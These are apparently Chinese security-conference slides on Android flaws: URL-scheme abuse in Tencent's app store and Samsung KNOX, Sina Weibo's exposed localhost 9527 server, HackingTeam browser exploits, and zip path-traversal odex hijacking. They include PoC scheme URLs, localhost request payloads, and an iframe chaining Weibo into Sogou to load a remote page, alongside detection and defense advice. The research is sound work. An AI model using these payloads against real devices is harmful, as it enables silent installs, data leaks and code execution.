应用宝注册了tmast协议的安装APK功能，却没有做安全限制。可以下载安装任意APK，
由于有秒装功能，所以可以远程静默安装。
TEST2
当时存在一个信任域的XSS，由于众多信任域中有一个sohu的域名，这个腾讯不可控，
导致可以使用该协议加载黑客的JS。
另外应用宝里注册了jsb协议，该协议的功能具体可以参考：
http://qzs.qq.com/open/mobile/yyb_gift_center/open_yyb_gift_test.html
查看源码，可以看到js中封装的框架是通过jsb://协议实现的。
案例2：三星KNOX远程安装漏洞
三星MDM获取更新的请求是通过注册的smdm协议唤起的。
smdm://meow?update_url=http://youserver
MDM客户端首先会取这个url里的update_url，在其后添加/latest，然后发起
HEAD请求，服务端会返回ETag、Content-Length和x-amz-meta-apk-version等。
MDM客户端会检查header中的这三个值，x-amz-meta-apk-version值会与当前
MDM包的版本进行比较。如果x-amz-meta-apk-version版本号大于当前的APK版
本，v0就会被置为1，即需要更新。此时用户手机会弹框提示有新更新，如果用
户点击了确定，就会发送一个get请求，获取apk更新地址等,然而更新地址是外
部可控的。
下载完进行安装时，MDM客户端会调用_installApplication(),该函数的的功能是禁止包验
证 (防止Google扫描APK)。安装完成之后再重新开启包验证。
分析整个客户端的处理逻辑，发现下载之后，安装过程既没有经过验证，也没有向用户
展示请求的权限。
在启动恶意程序时，也可以通过为其注册一个第三方协议，然后通过网页唤醒。
最新版V5.3.0 新浪微博注册了sinaweibo://第三方协议，然而多处接口处理不当，导
致可远程拒绝服务.
案例3：新浪微博
POC:
XXX=
sinaweibo://browser/close 或
sinaweibo://compose?pack=com.yixia.videoeditor 或
sinaweibo://addgroupmember?containerid=102603
sinaweibo://browser/?url=http://www.vul.com/uxss.html
另外可以利用xss(uxss)、csrf等攻击方式利用登录状态完成一些越权操作。
隐藏在系统中的APP后门：完全开放的服务端口
开放端⼝口漏洞
当开放端口绑定到0.0.0.0,那么任何IP都可以访问。
当开放端口绑定到127.0.0.1，那么同一设备上的应用依然可以访问。
Android应用可能会使用sockets(TCP、UDP、UNIX)在应用间或者自身应用
组件间进行通信。然而这种通信方式本身并没有提供任何身份认证。
新浪微博在native层(libweibohttp.so)实现了一个http server,绑定了127.0.0.1，监听
9527端口。
乌云案例：新浪微博V5.2.0      ID：小荷才露尖尖角
http请求解析处理逻辑位于com.sina.weibo.utils.weibohttpd.a/b/c三个类中。
主要有三种：
1.http://127.0.0.1:9527/login?callback=xxx
2.http://127.0.0.1:9527/query?appid=com.sina.weibo
3.http://127.0.0.1:9527/si?cmp=com.sina.weibo_
访问第一种请求时，如果用户处于登陆状态会返回用户的身份信息。
访问http://127.0.0.1:9527/login?callback=xxx，返回登陆用户的身份信息。
访问http://127.0.0.1:9527/query?appid=com.tencent.mtt ，返回QQ浏览器的安装信息。如
果未安装返回”no install”.
http://127.0.0.1:9527/si?cmp=com.sina.weibo_componentname可
以访问微博中未导出的组件。
访问
http://127.0.0.1:9527/si?cmp=com.sina.weibo_com.sina.weibo.exlibs.NewProjectModeActiv
ityPreLoading可以打开未导出组件“工程模式”,可以在应用权限范围内执行命令。
检测与防御
检测
可以通过netstat命令查看开放端口，系统自带的netstat以及Busybox里的p参数也不
是很好用。Google play上有一款应用:netstat plus,效果图:
防御
通信过程应增加身份校验措施，或者给用户明确的功能连接提示。
原理很简单，直接读取：
/proc/net/tcp
/proc/net/tcp6
/proc/net/udp
/proc/net/udp6
iframe.src = 
"http://127.0.0.1:9527/si?cmp=com.sohu.inputmethod.sogou_sogou.mobile.explorer.hotwords.
HotwordsWebViewActivity&data=http://X.X.X.X:80/go.html"; 
通过新浪微博为跳板，进入搜狗输入法的组件进行下一步攻击。
天上掉下来的通用漏洞：HackingTeam泄漏的0day漏洞
HackingTeam android  browser  exploit
漏洞：
CVE-2011-1202
CVE-2012-2825
CVE-2012-2871
影响：
android4.3以下系统浏览器
webview
远程代码执行
国内众多第三方浏览器（android  4.4  ～ 5.1）
自定义浏览器内核
腾讯的X5内核
UC的U3内核
百度的T5内核
漏洞1：CVE-2011-1202(信息泄露)
generate-id()引起的信息泄露
内存地址泄漏
patch
漏洞2：CVE-­2012-­2825(任意地址读)
类型混淆
任意内存读
恶意地址
patch
漏洞3：CVE-2012-2871(任意地址写)
Proof of concept （> android 4.4）
信息泄露
内存任意读
内存写漏洞
漏洞利用思路
1、用arrayBuffer在堆中喷大量的特定字符串，利用任意
读漏洞定位内存地址
2、利用任意写漏洞，确定arrayBuffer的起始地址，实现
有限空间任意读写
3、有限空间读写转化为任意地址读写
4、构造ROP  chain，覆盖虚函数表指针
X5内核漏洞利用演示
搜狗输入法
HOW？
浏览器作为攻击入口
Weibo作为跳板打开搜狗输入法
浏览器
weibo
搜狗输入法
X5内核
RCE
URL scheme
Server socket，
intent with data
loadUrl
X5内核加载恶意网页，执行代码
想不到的恶意文件：影响千万应用的安卓“寄生兽”漏洞
关于APK的缓存代码
安卓的应用程序apk文件是zip压缩格式的文件，apk文件中包含的classes.dex文
件相当于app的可执行文件，当app运行后系统会对classes.dex进行优化，生成对
应的odex格式的文件。
插件机制引入的攻击点
•
动态加载
•
反射调用
新的攻击入口
•
Zip解压缩漏洞
•
DexClassLoader的缓存校验漏洞
ZipEntry.getName没有过滤”../”
exploit
modTime
crc
1、修改dex，生成odex
2、修改odex
3、生成zip文件
Dalvikvm，不同机型适配
案例1  高德地图及SDK
案例2
输入法关联文件
案例3  UC浏览器
防护方案
对可能的劫持odex的攻击入口漏洞进行修复
对odex文件进行完整性校验
•
zip解压缩漏洞，过滤”../”跳转符
•
adb backup, allowBackup=”false”
•
Odex不要存储在sdcard
•
每次重新生成odex
•
存储odex信息，加载前校验
感谢
360  vulpecker  Team:
@RAyH4c
@sniperhg
@zpd2009
Thanks!